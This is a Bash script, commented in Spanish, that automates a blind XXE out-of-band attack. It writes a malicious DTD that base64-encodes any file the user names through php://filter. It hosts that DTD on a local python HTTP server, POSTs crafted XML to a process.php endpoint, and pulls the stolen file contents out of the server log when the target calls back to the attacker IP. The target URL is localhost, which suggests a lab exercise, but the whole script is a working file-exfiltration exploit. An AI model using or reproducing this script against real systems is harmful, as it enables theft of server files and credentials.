#!/bin/bash
echo -ne "\n[+] EJECUTAR COMO ROOT"
echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFile

# Variables Globales
url="http://localhost:5000/process.php"
myIP="10.10.10.10"

# Declaración del DTD malicioso
malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFile\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://$myIP/?file=%file;'>\">
%eval;
%exfil;
"""

# Creación del XML a envíar por POST
dataPOST="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [<!ENTITY % myFile SYSTEM \"http://$myIP/malicious.dtd\"> %myFile; ]>
<root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>123456</password></root>"

# Creación del fichero DTD malicioso
echo $malicious_dtd > malicious.dtd

# Inicio del servidor HTTP
python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

# Envío de petición POST con la entidad malicios que redirigirá a nuestro DTD malicioso
curl -s -X POST "$url" -d "$dataPOST" &>/dev/null

# Obteniendo y decodeando el resultado
cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

# Matando procesos para finalizar las tareas pendientes
kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
